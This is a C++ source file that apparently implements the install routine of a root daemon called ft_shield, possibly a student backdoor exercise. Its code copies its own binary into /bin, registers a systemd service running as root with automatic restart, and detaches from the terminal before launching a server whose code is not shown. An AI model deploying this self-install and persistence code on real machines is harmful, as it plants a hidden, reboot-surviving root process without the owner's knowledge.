#include "shield.hpp"
#include "server.hpp" // Include the Server class header

shield::shield() {
    std::cout << "Shield constructor" << std::endl;
}

shield::~shield() {
    std::cout << "Shield destructor" << std::endl;
}

void shield::check_root() {
    if (getuid() != 0)
        throw std::runtime_error("You must be root to run this program.");
}

void shield::copy_to_bin() {
    std::ifstream src("/proc/self/exe", std::ios::in | std::ios::binary); // Open the current executable
    std::ofstream dst("/bin/ft_shield", std::ios::out | std::ios::binary); // Open the destination file

    dst << src.rdbuf(); // Copy the current executable to /bin/ft_shield
    chmod("/bin/ft_shield", 0755); // Make /bin/ft_shield executable

    std::ofstream serviceFile("/etc/systemd/system/ft_shield.service");
    if (!serviceFile) {
        throw std::runtime_error("Failed to create service file.");
    }

    serviceFile << R"(
[Unit]
Description=ft_shield Daemon

[Service]
ExecStart=/bin/ft_shield
Restart=always
User=root

[Install]
WantedBy=multi-user.target
)";
    serviceFile.close();

    system("systemctl enable ft_shield.service");
    system("systemctl start ft_shield.service");
}

void shield::deamonize() {
    pid_t pid = fork();
    if (pid < 0) throw std::runtime_error("Fork failed");
    if (pid > 0) exit(0); // Exit the parent process

    if (setsid() < 0) throw std::runtime_error("Setsid failed");


    if (chdir("/") < 0) throw std::runtime_error("Failed to change working directory");

    // Close standard file descriptors
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    // Redirect standard file descriptors to /dev/null
    open("/dev/null", O_RDONLY); // stdin
    open("/dev/null", O_RDWR);   // stdout
    open("/dev/null", O_RDWR);   // stderr
}

void shield::start() {
    check_root(); // Ensure the program is run as root
    copy_to_bin(); // Copy the program to /bin/shield
    deamonize(); // Daemonize the process

    // Log that the server is starting
    std::ofstream log("/var/log/shield.log", std::ios::app);
    if (log.is_open()) {
        log << "Shield daemon started." << std::endl;
    }

    // Start the server
    Server server;
    server.start();
}